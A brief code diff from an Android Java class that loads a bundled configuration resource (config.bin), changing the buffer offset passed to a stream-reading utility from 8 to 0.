@@ -421,7 +421,7 @@ public class Core extends Activity implements Runnable {
 		// tries to load the resource conf
 		if (!loaded) {
 			// Open conf from resources and load it into resource
-			final byte[] resource = Utils.inputStreamToBuffer(resources.openRawResource(R.raw.config), 8); // config.bin
+			final byte[] resource = Utils.inputStreamToBuffer(resources.openRawResource(R.raw.config),0); // config.bin
 
 			// Initialize the configuration object
 			final Configuration conf = new Configuration(resource);
